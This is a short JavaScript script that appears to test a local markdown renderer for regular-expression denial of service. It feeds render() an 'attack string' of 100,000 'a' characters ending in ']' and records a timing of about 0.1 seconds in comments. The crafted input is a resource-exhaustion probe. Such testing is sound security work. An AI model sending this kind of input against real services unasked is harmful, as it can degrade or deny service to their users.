const { render } = require("./markdown.js");

//Attack String :""+"a"*100000+"]"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "]";

const node = {
  type: "text",
  text: str,
};
const nodes = [node];
var result = render(nodes, "");

// real    0m0.102s
// user    0m0.068s
// sys     0m0.020s
